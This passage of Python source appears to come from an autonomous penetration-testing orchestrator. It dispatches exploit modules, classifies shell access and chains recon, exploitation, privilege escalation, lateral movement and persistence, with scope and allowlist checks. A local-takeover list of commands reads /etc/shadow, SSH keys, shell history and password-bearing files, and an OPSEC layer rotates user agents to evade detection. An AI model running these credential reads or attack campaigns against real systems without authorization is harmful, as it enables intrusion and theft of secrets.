        as a non-verified run, NOT a hard failure -- the script itself may be
        valid and just need a manual operator run).

        The classification comes from ``classify_exploit_result`` (Phase 1.1),
        imported lazily so a missing dep never breaks the executor. The
        classifier is conservative: only strong shell / uid=0 / Meterpreter /
        NT AUTHORITY\\SYSTEM markers yield ``compromise``.
        """
        executor = self._tool_executor
        if executor is None:
            return None

        # 1. suggested_command wins -- it's already a complete shell invocation.
        command = mresult.suggested_command or ""
        if not command:
            # 2. Fall back to the module's generated Python script.
            script_text = mresult.script
            if not script_text:
                try:
                    script_text = module.generate_python_script(ctx) or ""
                except Exception:
                    script_text = ""
            if script_text:
                try:
                    modules_dir = ctx.workspace / "modules"
                    modules_dir.mkdir(parents=True, exist_ok=True)
                    safe_name = re.sub(
                        r"[^A-Za-z0-9_.-]", "_", f"{module.name}_{ctx.target_ip}.py"
                    )
                    script_path = modules_dir / safe_name
                    script_path.write_text(script_text, encoding="utf-8")
                    command = f"python {script_path} {ctx.target_ip}"
                except Exception as exc:  # noqa: BLE001 -- best-effort
                    state.add_timeline_event(
                        "dispatch_write_err",
                        f"Failed to write script for {module.name}: {exc}",
                    )
                    return None

        if not command:
            return None

        try:
            output = await asyncio.to_thread(executor, command, {"target": task.target})
        except Exception as exc:  # noqa: BLE001 -- best-effort dispatch
            state.add_timeline_event(
                "dispatch_err",
                f"{module.name} dispatch raised: {exc}",
                {"command": command[:200]},
            )
            return None

        output_text = str(output or "")
        state.add_timeline_event(
            "module_dispatch",
            f"Dispatched {module.name} artifact ({len(output_text)} bytes output)",
            {"command": command[:200], "output_len": len(output_text)},
        )

        # Conservative classification (Phase 1.1). Lazy import -- the dep lives
        # in tools/exploit_agent which is always present in the runtime, but the
        # import is deferred so a stale/missing module never breaks the
        # executor's hot path.
        try:
            from tools.exploit_agent.outcome_classify import classify_exploit_result

            classification = classify_exploit_result(output_text)
        except Exception:
            classification = {"outcome": "unknown", "shell_type": "", "privilege_level": "", "evidence": []}

        return output_text, classification

    # ── Swarm integration helpers (Tier 0 item 0.6b) ───────────────────────
    #
    # Every helper is a no-op when its agent/blackboard is absent, so legacy
    # callers and the existing test suite (which construct the executor with
    # only a scope_gate/risk_controller) are unchanged. They activate only when
    # agent_loop wires the swarm context into the autonomous orchestrator.

    def _run_critic(self, task: AttackTask) -> dict[str, Any] | None:
        """Run the CriticAgent pre-check.

        Returns None when no critic is wired (legacy path: only the inline
        scope/risk checks above apply). A returned dict carries
        decision/reasoning/modifications. The critic performs its OWN
        scope/risk checks, so this is defense-in-depth, not a substitute for
        the inline checks. Critic exceptions are swallowed and logged -- we
        fail OPEN here because the inline checks already enforced scope/risk,
        so a critic crash cannot widen scope; it can only lose the extra
        reasoning layer.
        """
        if self._critic is None:
            return None
        proposed = {
            "target": task.target,
            "phase": task.phase.value,
            "tool": task.module_name,
            "module_name": task.module_name,
            "risk_level": "high" if task.aggression == AggressionLevel.MAXIMUM else "medium",
            "aggression": task.aggression.value,
        }
        context = {
            "scope_gate": self._scope_gate,
            "risk_controller": self._risk_controller,
            "mission": self._mission_config,
            "model_client": self._model_client,
            "blackboard": self._blackboard,
        }
        try:
            result = self._critic.run(
                {"task_id": task.task_id, "proposed_action": proposed},
                context,
            )
            if result and result.output:
                return dict(result.output)
        except Exception as exc:  # fail open -- see docstring
            logger.warning(
                "Critic pre-check raised for %s (failing open): %r",
                task.module_name, exc,
            )
        return None

    def _apply_critic_modifications(self, task: AttackTask, modifications: dict[str, Any]) -> None:
        """Apply a critic 'modify' decision to the task in place.

        Honors risk-level downgrades (mapped back to an aggression level) and a
        ``require_mutation`` flag (recorded for the retry engine / mutator).
        Unknown modifications are ignored -- the run proceeds with the mutated
        task rather than being blocked, since the critic only downgrades risk.
        """
        if not modifications:
            return
        risk_level = modifications.get("risk_level")
        if risk_level == "medium" and task.aggression == AggressionLevel.MAXIMUM:
            task.aggression = AggressionLevel.AGGRESSIVE
            task.parameters["critic_risk_downgrade"] = "high->medium"
        elif risk_level == "low" and task.aggression in (
            AggressionLevel.MAXIMUM, AggressionLevel.AGGRESSIVE,
        ):
            task.aggression = AggressionLevel.NORMAL
            task.parameters["critic_risk_downgrade"] = "->low"
        if modifications.get("require_mutation"):
            task.parameters["critic_require_mutation"] = True
        logger.info("Critic modify applied to %s: %s", task.module_name, modifications)

    def _record_failure_on_blackboard(self, module_name: str) -> None:
        """Record a module failure on the shared blackboard.

        Feeds the CriticAgent's repeat-failure detection (Layer 4) so a
        re-attempt of the same failing module on the autonomous path is flagged
        for modification. No-op when no blackboard is wired (empty dict).

        Uses ``Blackboard.append_to`` (atomic, dedupe via extend_list) so the
        write is safe even if the swarm ``route()`` loop is concurrently
        touching ``failed_modules`` via the reflection agent — the legacy
        ``bb.setdefault(...)`` + in-place ``.append`` mutated the list outside
        any lock and raced under the shared-blackboard model.
        """
        bb = self._blackboard
        if not bb:
            return
        # extend_list with dedupe=True gives the "append if absent" semantics
        # the old setdefault+append had, atomically.
        if hasattr(bb, "extend_list"):
            bb.extend_list("failed_modules", [module_name])
        else:  # legacy plain-dict fallback (defensive)
            failed = bb.setdefault("failed_modules", [])
            if module_name not in failed:
                failed.append(module_name)

    def _record_success_on_blackboard(self, module_name: str) -> None:
        """Record a module success on the shared blackboard.

        Clears the module from the repeat-failure list (so the critic stops
        flagging it) and notes it as successful. No-op when no blackboard wired.

        Atomic via ``Blackboard.remove_from_list`` / ``append_to`` so the
        failed→successful transition is safe against a concurrent reflection
        agent merge.
        """
        bb = self._blackboard
        if not bb:
            return
        if hasattr(bb, "remove_from_list"):
            bb.remove_from_list("failed_modules", module_name)
            bb.append_to("successful_modules", module_name)
        else:  # legacy plain-dict fallback (defensive)
            failed = bb.get("failed_modules")
            if failed and module_name in failed:
                failed.remove(module_name)
            worked = bb.setdefault("successful_modules", [])
            if module_name not in worked:
                worked.append(module_name)

    def _run_reflection(self, task: AttackTask, state: AttackState, result: dict[str, Any]) -> None:
        """Run the ReflectionAgent post-check.

        The agent updates the shared blackboard itself (``last_reflection``,
        ``strategy_shift``, and a merged ``failed_modules``). It is
        heuristic-only when no model_client is wired, so per-module cost is low.
        Advisory -- exceptions are swallowed so reflection can't stall the
        campaign. No-op when no reflection agent is wired.
        """
        if self._reflection is None:
            return
        inner = result.get("result") if isinstance(result, dict) else None
        status = inner.get("status", "") if isinstance(inner, dict) else ""
        success = bool(result.get("success")) and status in (
            "success", "exploited", "script_generated", "info",
        )
        battle_entry = {
            "tool": task.module_name,
            "target": task.target,
            "success": success,
            "summary": str(status),
            "error": result.get("error", ""),
        }
        try:
            self._reflection.run(
                {
                    "task_id": task.task_id,
                    "battle_log": [battle_entry],
                    "session_state": state.to_dict(),
                },
                {
                    "memory": None,
                    "model_client": self._model_client,
                    "blackboard": self._blackboard,
                },
            )
        except Exception as exc:  # advisory -- never stall the campaign
            logger.warning(
                "Reflection post-check raised for %s (continuing): %r",
                task.module_name, exc,
            )

    def _record_lesson_on_success(
        self,
        task: AttackTask,
        state: AttackState,
        result: dict[str, Any],
    ) -> None:
        """Persist a cross-mission lesson on a confirmed win.

        Advisory/best-effort — never raises, never blocks the campaign. No-op
        when no SemanticMemoryManager is wired (the default). Uses a DISTINCT
        ``action_type='orchestrator:module_success'`` so these rows are
        isolated from the exploit-loop lessons ('reflection:exploit_loop') and
        the swarm reflection lessons ('reflection:strategy_shift') —
        downstream recall sees all three families, but the Bayesian
        ExperienceStore (operational exploit-action confidence) is untouched.
        """
        if self._semantic_memory is None:
            return
        # ponytail: cap text length to keep the embedding + DB row bounded;
        # store_lesson already truncates to 8000 chars, this is a tighter cap.
        note = str(result.get("note") or result.get("status") or "succeeded")[:300]
        text = f"{task.target} {task.module_name} ({task.phase.value}) succeeded: {note}"
        try:
            self._semantic_memory.store_lesson(
                target_signature=task.target,
                action_type="orchestrator:module_success",
                outcome="success",
                text=text,
                confidence=0.75,
                metadata={
                    "module": task.module_name,
                    "phase": task.phase.value,
                    "aggression": task.aggression.value,
                    "shell_type": result.get("shell_type", ""),
                    "privilege_level": result.get("privilege_level", ""),
                    "source": "autonomous_orchestrator",
                },
            )
        except Exception as exc:  # noqa: BLE001 -- never break the campaign on a lesson write
            logger.debug("store_lesson skipped for %s: %r", task.module_name, exc)


# ---------------------------------------------------------------------------
# Autonomous orchestrator
# ---------------------------------------------------------------------------

class AutonomousOrchestrator:
    """Main autonomous attack orchestrator.

    Usage::
        orchestrator = AutonomousOrchestrator(mission_config, workspace, tool_executor)
        results = await orchestrator.run_autonomous_campaign(targets=["10.0.0.50"])
    """

    # ponytail: campaign-level cap on per-module retries. The per-task
    # max_retries bound (default 3) only governs a single AttackTask; the
    # aggression-escalation loop (_phase_exploitation:1622-1626) re-queues
    # failed modules with a fresh retry_count=0 each time, so without a
    # campaign-level budget a structural-failure module (e.g. Log4jRCE
    # against a non-vulnerable target) gets retried indefinitely until the
    # aggression ceiling is hit. Drop a module from the retry set once it
    # has failed this many times total in state.failed_attempts[mod].
    _max_module_failures: int = 3

    def __init__(
        self,
        mission_config: dict[str, Any],
        workspace_root: Path,
        tool_executor: Callable[[str, dict[str, Any]], str] | None = None,
        *,
        recon_config: ReconConfig | None = None,
        scope_gate: Any | None = None,
        risk_controller: Any | None = None,
        evidence_store: Any | None = None,
        blackboard: dict[str, Any] | None = None,
        model_client: Any = None,
        critic_agent: Any = None,
        reflection_agent: Any = None,
        experience_store: Any | None = None,
        semantic_memory: Any | None = None,
    ) -> None:
        self._workspace = workspace_root
        self._workspace.mkdir(parents=True, exist_ok=True)
        self._mission = mission_config
        self._tool_executor = tool_executor
        self._recon_config = recon_config or ReconConfig()
        self._recon = ReconPipeline(self._recon_config)
        # Evidence-aware module ranking: the dormant ExperienceStore at
        # tools/attack_modules/registry.py:205-328 already supports Bayesian
        # confidence boosting/demotion, but the autonomous path never passed
        # it (the audit flagged this -- ranked modules always got neutral 0.5).
        # Build a shared default-backed store when the caller doesn't supply one.
        self._experience_store = experience_store
        if self._experience_store is None:
            try:
                from db import get_default_db
                from tools.experience_store import ExperienceStore
                self._experience_store = ExperienceStore(get_default_db())
            except Exception:  # noqa: BLE001 -- ranking degrades to static-only
                self._experience_store = None
        # D1: semantic memory consumer. The exploit-agent loop and swarm
        # reflection already write cross-mission lessons via
        # SemanticMemoryManager.store_lesson; the orchestrator is the missing
        # campaign-level consumer so a multi-phase campaign learns across
        # missions, not just within the exploit loop. Read-only consumer —
        # store_lesson writes to the lessons table; no execution authority.
        # Built from config when not supplied (mirrors agent_loop.py:172-182
        # and tools/exploit_agent/loop.py:470-489). Gated by
        # ``orchestrator.semantic_memory`` (default false) so the wiring is
        # opt-in per the "new attack-path capabilities must be opt-in" rule.
        self._semantic_memory = semantic_memory
        if self._semantic_memory is None and bool(mission_config.get("semantic_memory", False)):
            try:
                from db import get_default_db
                from tools.semantic_memory import SemanticMemoryManager
                _ollama_cfg = (mission_config.get("ollama", {}) or {})
                # ponytail: embeddings stay on local Ollama (embed_host) when
                # set; falls back to ollama.host for cloud-only installs.
                _embed_host = _ollama_cfg.get("embed_host") or _ollama_cfg.get("host", "https://api.ollama.com")
                self._semantic_memory = SemanticMemoryManager(
                    db=get_default_db(),
                    ollama_host=_embed_host,
                    embedding_model=str(mission_config.get("embedding_model", "nomic-embed-text")),
                )
            except Exception as exc:  # noqa: BLE001 -- cross-mission learning degrades to no-op
                logger.debug("SemanticMemoryManager wiring skipped: %r", exc)
                self._semantic_memory = None
        # Phase 6.2: build an OpsecManager from the ``opsec`` config block
        # (merged into mission_config by the campaign call sites). Tolerant of
        # its absence -> disabled profile -> pacing no-op. Also published as the
        # process-global UA source so HTTP egress rotates UAs when ua_rotation
        # is on. Wrapped so an OPSEC build failure can never block orchestration.
        #
        # Phase 6.2+ (target-aware OPSEC): the manager passed to the executor is
        # the BASE (unresolved) manager -- ``AttackModuleExecutor.execute``
        # resolves it per task.target so each action gets the right posture
        # (local/private -> OPSEC off, public -> OPSEC on). The process-global
        # UA source is published resolved against the campaign's PRIMARY target
        # so egress UA rotation follows the same local/public rule. The primary
        # target is read from mission_config["target"] (set by the MCP campaign
        # tools) or the EXPLOIT_TARGET env (set by mcp_session at boot).
        try:
            from tools.opsec import OpsecManager
            from tools.opsec import configure as _opsec_configure
            self._opsec = OpsecManager.from_config(mission_config or {})
            _primary_target = (mission_config or {}).get("target") or os.environ.get("EXPLOIT_TARGET", "")
            _ua_profile = self._opsec.profile
            if _primary_target:
                _ua_profile = self._opsec.resolve_for_target(_primary_target).profile
            _opsec_configure(_ua_profile)
        except Exception:  # noqa: BLE001 -- OPSEC is best-effort
            self._opsec = None
        # Pass the swarm context through so the autonomous path runs the
        # critic pre-check / reflection post-check / shared blackboard
        # (Tier 0 item 0.6b). Unwired -> AttackModuleExecutor behaves as before.
        self._executor = AttackModuleExecutor(
            scope_gate, risk_controller, evidence_store,
            blackboard=blackboard,
            mission_config=mission_config,
            model_client=model_client,
            critic_agent=critic_agent,
            reflection_agent=reflection_agent,
            tool_executor=tool_executor,
            opsec_manager=self._opsec,
            semantic_memory=self._semantic_memory,
            experience_store=self._experience_store,
        )

        self._states: dict[str, AttackState] = {}
        self._tasks: dict[str, AttackTask] = {}
        self._task_counter = 0
        self._running = True
        self._max_cycles = mission_config.get("max_cycles", 100)
        self._max_aggression = AggressionLevel(mission_config.get("max_aggression", "maximum"))
        # Capability-upgrade (§9): dynamic-composition counters. When a module
        # fails with PREREQUISITE_MISSING, a producer module is scheduled for
        # the missing artifact. Bounded: one prereq task per failing task (via
        # the per-batch ``prereq_scheduled`` set) plus this campaign-level cap
        # so a structural-missing chain cannot balloon the task queue. The cap
        # rides on the existing per-module failure budget so no new knob is
        # introduced.
        self._prereq_tasks_added = 0
        self._prereq_recovery_cap = max(1, int(self._max_module_failures))
        # Pivot-depth cap (Tier 0 item 0.6a): the lateral-movement phase recurses
        # into each discovered pivot target via _attack_target, which previously
        # had NO depth bound -- unbounded pivoting is a safety hole. Depth 0 is
        # the operator's original target; each successful pivot increments it.
        #
        # DEFAULT IS 0 (single-IP lock): per CLAUDE.md the engine is "still
        # target-locked to a single IP (AI cannot pivot to other hosts)". With
        # depth 0, ``_phase_lateral_movement`` discovers pivot targets but
        # ``_depth + 1 < 0`` is always False, so it logs the cap and never
        # recurses into them. An operator who has written authorization covering
        # the reachable hosts may opt in to bounded pivoting by setting
        # ``max_pivot_depth: N`` in mission.yaml/config.
        self._max_pivot_depth = int(mission_config.get("max_pivot_depth", 0))

        # Phase 2 opt-in capabilities (default OFF — new attack-path capabilities
        # must be opt-in per CLAUDE.md). These flow in from config.yaml's
        # ``autonomous`` block via the mission_config dict the call sites build
        # (see tools/mcp_tools/attack_modules.py start_autonomous_campaign /
        # run_campaign_step, which merge config["autonomous"] into mission_config).
        # ``persistence_phase`` enables the PERSISTENCE phase handler (2.2);
        # ``checkpoint_every`` makes run_autonomous_campaign save
        # attack_states.json every N completed targets (2.3, 0 = off);
        # ``adaptive_replan`` enables per-target multi-round replan + vuln
        # chaining (2.4). All default off so the default single-pass
        # _attack_target behavior is unchanged.
        self._persistence_enabled = bool(mission_config.get("persistence_phase", False))
        self._checkpoint_every = max(0, int(mission_config.get("checkpoint_every", 0) or 0))
        self._adaptive_replan = bool(mission_config.get("adaptive_replan", False))
        # Phase 3: advisory local_exploit_suggester follow-up after the privesc
        # batch. Passed through as ``msf_auto_les`` (or nested ``msf`` dict) by
        # the campaign call sites. Default off. When on AND access was
        # achieved, a single LocalExploitSuggester info-task runs -- it only
        # SUGGESTS the MSF recipe (Path B has no MSF session id, so it never
        # fabricates one).
        self._auto_local_exploit_suggester = bool(
            mission_config.get("msf_auto_les", False)
            or ((mission_config.get("msf") or {}).get("auto_local_exploit_suggester", False))
        )

        # Phase 5: campaign-entry preflight (dedup + non-routable filter +
        # scope-gate pre-check). All opt-in / default-off so a single-IP
        # campaign is byte-identical to before. ``dedup_targets`` collapses
        # duplicate IPs / CIDR overlap / hosts resolving to the same IP;
        # ``skip_non_routable`` drops RFC1918/link-local/reserved addresses
        # that are not the operator's own host (those are handled by the
        # local-takeover playbook).
        self._dedup_targets = bool(mission_config.get("dedup_targets", False))
        self._skip_non_routable = bool(mission_config.get("skip_non_routable", False))

        # Phase 5: hard-target cutoff. After this many adaptive rounds with
        # zero novel candidate modules AND zero access achieved, give up on
        # the target instead of burning the remaining ``max_cycles`` budget.
        # 0 = off (current behavior).
        self._hard_target_max_rounds = max(
            0, int(mission_config.get("hard_target_max_rounds", 0) or 0)
        )

        # Domain targeting: the operator's original --target (domain or IP) and
        # the resolved IP for a domain target. Threaded in from
        # run_autonomous_campaign(original_target=..., resolved_ip=...) so the
        # Path-B subdomain expansion in _phase_reconnaissance actually fires
        # (it's gated on state.original_target). Defaults to "" so IP-only
        # campaigns are unaffected.
        self._original_target = ""
        self._resolved_ip = ""

    def _new_task_id(self) -> str:
        self._task_counter += 1
        return f"ATK-{self._task_counter:05d}"

    def get_state(self, target: str) -> AttackState:
        if target not in self._states:
            state = AttackState(target=target)
            # Thread the domain-targeting context into the freshly-created
            # AttackState so _phase_reconnaissance's subdomain-expansion branch
            # (gated on state.original_target) is reachable on Path B.
            if self._original_target and not state.original_target:
                state.original_target = self._original_target
            if self._resolved_ip and not state.resolved_ip:
                state.resolved_ip = self._resolved_ip
            self._states[target] = state
        return self._states[target]

    # ── Campaign-entry preflight (Phase 5) ──────────────────────────────────────

    def _preflight_targets(self, targets: list[str]) -> list[str]:
        """Resolve, de-duplicate, scope-check and filter the campaign target list.

        Runs before any scan is fired. Each filter is opt-in (default off), so
        a single-IP campaign is byte-identical to before this method existed.

        1. **Scope gate pre-check** -- every target must already be authorized
           via the same matcher the MCP tool layer uses
           (``_check_allowlist``). When ``exploit.require_explicit_allowlist``
           is False this is a no-op. This is the "avoid stuff that can't be
           attacked" lock applied one layer earlier: previously an unauthorized
           target still got a full Nmap scan before the tool-layer gate ever
           fired.
        2. **Non-routable filter** -- drop RFC1918 / link-local / reserved
           addresses that are not the operator's own host. Those are handled
           by the local-takeover playbook (``is_local_target``), not by a
           network campaign. ``169.254.169.254`` and ``0.0.0.0`` used to get
           scanned for free.
        3. **Dedup by resolved IP** -- collapse duplicate IPs, CIDR overlap,
           and hosts resolving to the same IP. Domains that fail DNS are kept
           (they may still be attackable via the hostname).

        Returns the filtered list. Skips are recorded as timeline events on a
        fresh ``AttackState`` so they survive into ``attack_states.json``.
        """
        if not targets:
            return []

        from tools.mcp_shared import _check_allowlist
        from tools.validation_utils import (
            is_local_target,
            is_private_or_local_target,
            resolve_target_to_ip,
        )

        seen_ips: set[str] = set()
        kept: list[str] = []

        for target in targets:
            target = (target or "").strip()
            if not target:
                continue

            # 1. Scope gate pre-check (no-op when allowlist is off). Uses the
            # same matcher the MCP tool layer uses so the lock is applied one
            # layer earlier: previously an unauthorized target still got a full
            # Nmap scan before the tool-layer gate ever fired.
            allowed, reason = _check_allowlist(target, self._mission)
            if not allowed:
                state = self.get_state(target)
                state.add_timeline_event(
                    "target_skipped_out_of_scope",
                    f"Target {target} is not authorized: {reason}; skipping",
                    {"target": target, "reason": reason},
                )
                logger.info(f"[PREFLIGHT] {target} out of scope -- skipping")
                continue

            # Resolve for classification / dedup. A domain that fails DNS is
            # kept verbatim (don't drop it -- it may be attackable by name).
            resolved = resolve_target_to_ip(target)
            effective = resolved or target

            # 2. Non-routable filter. The operator's own host is NOT skipped
            # here -- it has its own local-takeover path in _attack_target.
            if self._skip_non_routable and is_private_or_local_target(effective):
                if not is_local_target(effective):
                    state = self.get_state(target)
                    state.add_timeline_event(
                        "target_skipped_non_routable",
                        f"Target {target} is non-routable ({effective}); skipping network campaign",
                        {"target": target, "resolved_ip": effective or ""},
                    )
                    logger.info(f"[PREFLIGHT] {target} non-routable -- skipping")
                    continue

            # 3. Dedup by resolved IP (or the literal when resolution failed).
            dedup_key = effective if resolved else target
            if dedup_key in seen_ips:
                state = self.get_state(target)
                state.add_timeline_event(
                    "target_dedup",
                    f"Target {target} resolves to {dedup_key}; already scheduled -- skipping duplicate",
                    {"target": target, "resolved_ip": dedup_key},
                )
                logger.info(f"[PREFLIGHT] {target} duplicate of {dedup_key} -- skipping")
                continue
            seen_ips.add(dedup_key)

            kept.append(target)

        if len(kept) != len(targets):
            logger.info(
                f"[PREFLIGHT] {len(targets)} target(s) -> {len(kept)} after preflight"
            )
        return kept

    # ── Main campaign runner ─────────────────────────────────────────────

    async def run_autonomous_campaign(
        self,
        targets: list[str],
        *,
        resume: bool = False,
        original_target: str = "",
        resolved_ip: str = "",
    ) -> dict[str, Any]:
        """Run a full autonomous attack campaign against multiple targets.

        Tier 1.3: when ``resume`` is True, load previously-saved attack state
        from ``attack_states.json`` in the workspace BEFORE attacking. The
        recovered per-target ``AttackState`` (recon_result, successful_exploits,
        failed_attempts, current_phase, credentials, access) means each target
        skips recon it already finished and doesn't re-fire modules that
        already succeeded/failed. A missing/empty state file degrades
        gracefully to a fresh start (see ``load_state``).

        Domain targeting: pass ``original_target`` (the operator's domain
        --target) and ``resolved_ip`` so the Path-B subdomain-expansion branch
        in _phase_reconnaissance fires. When both are "" (the default), an
        IP-only campaign runs unchanged.
        """
        # Stash on the instance so get_state() can thread them into freshly-
        # created AttackState objects (get_state has no kwargs of its own).
        if original_target:
            self._original_target = original_target
        if resolved_ip:
            self._resolved_ip = resolved_ip
        logger.info(f"Starting autonomous campaign against {len(targets)} targets")
        campaign_start = time.monotonic()

        if resume:
            state_path = self._workspace / "attack_states.json"
            loaded = self.load_state(state_path)
            if loaded:
                logger.info("Resume: prior attack state loaded")
            else:
                logger.info("Resume requested but no usable state found — fresh start")

        results: dict[str, Any] = {}
        completed = 0

        # Phase 5: campaign-entry preflight. Resolve/dedupe/scope-check the
        # target list BEFORE spending a single scan on it. A duplicate IP, a
        # non-routable address, or an out-of-scope host would otherwise each
        # get a full Nmap -p- scan + exploitation campaign. All three filters
        # are opt-in (default off) so a single-IP campaign is byte-identical.
        targets = self._preflight_targets(targets)

        for target in targets:
            if not self._running:
                break
            # Phase 2.3: crash-bounded per-target dispatch. A single target's
            # unexpected exception must NOT abort the whole campaign -- record
            # the failure and continue so the operator still gets results for
            # the remaining targets (and a checkpoint preserves progress).
            try:
                result = await self._attack_target(target)
            except Exception as exc:  # noqa: BLE001 -- crash-bounded: one target shouldn't kill the campaign
                logger.exception(f"Crash-bounded: _attack_target({target}) raised {exc}")
                state = self.get_state(target)
                state.add_timeline_event(
                    "target_crash", f"Target {target} aborted: {exc}", {"error": str(exc)}
                )
                result = {"status": "crashed", "error": str(exc), "state": state.to_dict()}
            results[target] = result
            completed += 1
            # Phase 2.3: periodic checkpoint. Every ``checkpoint_every`` completed
            # targets (opt-in, 0 = off), persist attack_states.json so a crashed
            # run resumes with real progress. The save itself is best-effort --
            # a checkpoint failure never aborts the campaign.
            if self._checkpoint_every > 0 and completed % self._checkpoint_every == 0:
                try:
                    self.save_state()
                    logger.info(f"[CHECKPOINT] Saved attack state after {completed} target(s)")
                except Exception as exc:  # noqa: BLE001 -- checkpoint failure is non-fatal
                    logger.warning(f"[CHECKPOINT] Save failed (non-fatal): {exc}")

        campaign_duration = time.monotonic() - campaign_start
        logger.info(f"Campaign complete in {campaign_duration:.1f}s")

        return {
            "targets": targets,
            "results": results,
            "duration": campaign_duration,
            "total_tasks": len(self._tasks),
            "successful_exploits": sum(len(s.successful_exploits) for s in self._states.values()),
            "states": {t: s.to_dict() for t, s in self._states.items()},
        }

    async def _attack_target(self, target: str, *, _depth: int = 0) -> dict[str, Any]:
        """Run full attack lifecycle against a single target.

        ``_depth`` tracks how many pivot hops from the operator's original
        target (depth 0) this call is. ``_phase_lateral_movement`` caps further
        recursion at ``self._max_pivot_depth`` so a chain of pivots can't run away.
        """
        if not self._running:
            return {"status": "stopped", "state": self.get_state(target).to_dict()}
        state = self.get_state(target)
        logger.info(f"Starting attack lifecycle for {target} (pivot depth {_depth})")
        state.add_timeline_event("campaign_start", f"Attack campaign started against {target}")

        # Gap 2: local-target short-circuit. If the target is the operator's
        # own host (loopback / a local interface), the network-brute-force
        # phase would attack our own listeners -- recon, exploit, and lateral
        # movement are all the wrong shape for "you are already on the box."
        # Run the local-takeover playbook (filesystem reads + privesc) instead.
        # The scope gate is NOT bypassed: _phase_privilege_escalation routes
        # through AttackModuleExecutor.execute -> scope_gate.check_scope(
        # asset=task.target) per CLAUDE.md -- the local shortcut only adds a
        # locality branch before the existing phase calls.
        if is_local_target(state.target):
            await self._phase_local_takeover(state)
            await self._phase_validation(state)
            state.add_timeline_event(
                "campaign_end", "Local-takeover campaign completed for local target"
            )
            return {"status": "complete", "state": state.to_dict()}

        # Phase 1: Deep reconnaissance
        await self._phase_reconnaissance(state)
        if not state.recon_result or not state.recon_result.open_ports:
            logger.warning(f"No open ports on {target}, ending campaign")
            state.add_timeline_event("no_attack_surface", "No open ports found")
            return {"status": "no_attack_surface", "state": state.to_dict()}

        # Phase 2: Service enumeration (already done in recon pipeline)
        state.current_phase = AttackPhase.ENUMERATION
        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)

        # Phases 3-6. The default path is a single pass (exploit -> privesc ->
        # lateral -> persistence -> validation). When ``adaptive_replan`` is on
        # (Phase 2.4, opt-in) the exploit/privesc/lateral sequence runs as a
        # bounded multi-round loop with pre-round replan and post-success
        # vuln-chaining; persistence still runs once after the rounds converge.
        if self._adaptive_replan:
            await self._run_adaptive_rounds(state, _depth)
        else:
            # Phase 3: Exploitation - automatically select and run attack modules
            await self._phase_exploitation(state)

            # Phase 5: hard-target cutoff (single-pass path). _phase_exploitation
            # escalates aggression and retries once internally, so after it
            # returns with no access AND aggression already at the configured
            # ceiling there is nothing left to escalate into -- skip privesc /
            # lateral and let validation run. Opt-in (default off).
            if (
                not state.access_achieved
                and self._hard_target_max_rounds
                and state.aggression >= self._max_aggression
            ):
                logger.info(
                    f"[HARD] {state.target} at max aggression with no access "
                    f"-- giving up (hard_target_max_rounds={self._hard_target_max_rounds})"
                )
                state.add_timeline_event(
                    "hard_target_give_up",
                    f"Target {state.target} reached max aggression "
                    f"({state.aggression.value}) with no access; giving up.",
                    {"aggression": state.aggression.value},
                )

            # Phase 4: Privilege escalation
            if state.access_achieved and state.privilege_level not in ("system", "root", "admin"):
                await self._phase_privilege_escalation(state)

            # Phase 5: Lateral movement
            if state.pivot_targets:
                await self._phase_lateral_movement(state, _depth)

        # Phase 5.5: Persistence (opt-in, Phase 2.2). Only after a foothold is
        # established -- persisting on a host you do not yet control is a no-op.
        if self._persistence_enabled and state.access_achieved:
            await self._phase_persistence(state)

        # Phase 6: Validation
        await self._phase_validation(state)

        state.add_timeline_event("campaign_end", f"Attack campaign completed for {target}")
        return {"status": "complete", "state": state.to_dict()}

    # ── Phase handlers ───────────────────────────────────────────────────

    async def _phase_local_takeover(self, state: AttackState) -> None:
        """Local-target playbook (Gap 2): the operator box IS the target.

        The network-brute-force phase (recon -> exploit -> lateral) attacks the
        box's own listeners -- the wrong shape when the operator is already on
        the host. Instead, read the local filesystem FIRST (the LOCAL TARGET
        PLAYBOOK from ``tools/exploit_agent/prompt.py``), then go straight to
        privilege escalation. The privesc modules (``LinuxPrivescCheck``,
        ``SUIDEnumeration``, ``KernelExploitCheck``, ``ContainerBreakout``) do
        their own local enumeration and still route through
        ``AttackModuleExecutor.execute`` -> ``scope_gate.check_scope``.

        The raw local-read commands run via the optional ``tool_executor``
        callback when wired; if it is None (standalone orchestrator), the reads
        are skipped and only the privesc modules run.
        """
        logger.info(
            f"[LOCAL] Target {state.target} is this host -- local-takeover phase"
        )
        ui.phase_change("local_takeover")
        state.current_phase = AttackPhase.PRIVILEGE_ESCALATION
        _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
        state.add_timeline_event(
            "local_takeover",
            "Local-target playbook: filesystem enumeration + privilege escalation",
        )

        # The playbook's local-read commands (mirrors exploit_agent/prompt.py
        # LOCAL TARGET PLAYBOOK). Best-effort: a failure in one command does
        # not abort the phase.
        local_cmds = [
            "cat /etc/passwd",
            "sudo -n cat /etc/shadow 2>/dev/null",
            "ls -la /home/*/.ssh /root/.ssh 2>/dev/null",
            "find / -perm -4000 -type f 2>/dev/null",
            "find / -perm -2000 -type f 2>/dev/null",
            "find / -writable -type d 2>/dev/null | head",
            "cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null",
            "ls -la /opt /srv /var/www /etc/mysql",
            "grep -rIl 'password' /etc/ 2>/dev/null | head",
            "env; cat ~/.bash_history ~/.zsh_history 2>/dev/null",
        ]
        if self._tool_executor:
            for cmd in local_cmds:
                try:
                    out = await asyncio.to_thread(
                        self._tool_executor, cmd, {"target": state.target},
                    )
                    state.add_timeline_event(
                        "local_read", cmd, {"output_len": len(str(out or ""))}
                    )
                except Exception as exc:  # noqa: BLE001 -- best-effort reads
                    state.add_timeline_event("local_read_err", f"{cmd}: {exc}")
        else:
            state.add_timeline_event(
                "local_read_skipped",
                "No tool_executor wired -- privesc modules still run local enumeration",
            )

        # Privesc modules do their own local enumeration (SUID, kernel, container).
        await self._phase_privilege_escalation(state)

    async def _phase_reconnaissance(self, state: AttackState) -> None:
        """Run deep reconnaissance and store results.

        Tier 1.3 resume: if ``state.recon_result`` already carries open ports
        (rebuilt from ``attack_states.json`` by ``load_state``), the prior
        run's recon is REUSED rather than re-scanned. Re-scanning on resume
        would defeat the entire point of reattaching: it's the loudest,
        slowest, most detection-prone phase, and the operator resumed
        specifically to avoid redoing it. An empty/missing prior recon (fresh
        start, or a prior run that found nothing) falls through to a real
        scan as before.
        """
        logger.info(f"[RECON] Starting reconnaissance against {state.target}")
        ui.phase_change("reconnaissance")
        state.current_phase = AttackPhase.RECONNAISSANCE
